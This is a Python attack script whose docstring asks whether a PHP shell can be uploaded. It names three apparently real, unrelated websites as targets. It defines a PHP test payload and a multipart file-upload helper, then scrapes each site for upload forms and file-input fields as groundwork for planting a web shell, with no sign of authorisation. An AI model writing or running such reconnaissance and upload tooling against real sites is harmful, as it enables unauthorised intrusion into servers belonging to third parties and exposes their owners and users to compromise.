#!/usr/bin/env python3
"""test upload endpoints - can we upload php shell?
Targets: 3chan.net (imageboard), hemeixinpcb.com (PCB co), dentworksexpress.com
"""
import urllib.request, urllib.parse, re, http.cookiejar, uuid

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=12, data=None, files=None, referer=None):
    h = {**UA}
    if referer: h["Referer"] = referer
    try:
        if files:
            boundary = uuid.uuid4().hex
            body = b""
            for k, (fn, content, ctype) in files.items():
                body += b"--" + boundary.encode() + b"\r\n"
                body += ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (k, fn)).encode()
                body += ('Content-Type: %s\r\n\r\n' % ctype).encode()
                body += content + b"\r\n"
            body += b"--" + boundary.encode() + b"--\r\n"
            h["Content-Type"] = "multipart/form-data; boundary=" + boundary
            req = urllib.request.Request(url, data=body, headers=h)
        elif data:
            h["Content-Type"] = "application/x-www-form-urlencoded"
            req = urllib.request.Request(url, data=data.encode(), headers=h)
        else:
            req = urllib.request.Request(url, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read(50000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)[:80]

SHELL = b'<?php echo "SHELL_TEST_314159"; ?>'

# --- 3chan.net: find upload form ---
print("=== 3chan.net ===", flush=True)
op, cj = get_opener()
code, final, body = fetch(op, "http://3chan.net/")
print("home: %s size=%d" % (code, len(body)), flush=True)
forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.I)
print("forms:", forms[:5], flush=True)
file_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']*)["\']', body, re.I)
print("file inputs:", file_inputs[:3], flush=True)

# --- hemeixinpcb.com ---
print("\n=== hemeixinpcb.com ===", flush=True)
op2, cj2 = get_opener()
code, final, body2 = fetch(op2, "https://www.hemeixinpcb.com/")
print("home: %s size=%d" % (code, len(body2)), flush=True)
file_inputs2 = re.findall(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']*)["\']', body2, re.I)
print("file inputs:", file_inputs2[:3], flush=True)
# find upload form action
m = re.search(r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*action=["\']([^"\']*)["\']', body2, re.I)
print("upload action:", m.group(1) if m else "?", flush=True)

# --- dentworksexpress ---
print("\n=== dentworksexpress.com ===", flush=True)
op3, cj3 = get_opener()
code, final, body3 = fetch(op3, "http://dentworksexpress.com/")
print("home: %s size=%d" % (code, len(body3)), flush=True)
file_inputs3 = re.findall(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']*)["\']', body3, re.I)
print("file inputs:", file_inputs3[:3], flush=True)
